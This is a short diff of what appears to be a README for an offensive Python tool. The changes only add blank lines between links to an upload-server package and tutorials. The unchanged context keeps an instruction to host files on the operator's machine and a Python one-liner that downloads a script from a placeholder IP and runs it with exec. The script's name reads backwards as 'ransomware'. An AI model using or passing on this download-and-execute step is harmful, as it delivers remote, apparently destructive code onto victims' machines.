@@ -15,8 +15,13 @@ Your machine - Example: python3 -m uploadserver 44444
 python3 -c ("""from urllib.request import urlopen;url = 'http://< YOUR IP >/< DIRECTORY >/3rawm05nar.py';outtie = urlopen(url).read();getit = outtie.decode('utf-8');exec(outtie)""")
 # Additional Resources
 NetworkChuck
+
 https://www.youtube.com/watch?v=UtMMjXOlRQc&t=609s
+
 HTTP/HTTPS python upload server
+
 https://pypi.org/project/uploadserver/
+
 Python simplehttpserver
+
 https://stackoverflow.com/questions/39788591/python-simplehttpserver-to-receive-files
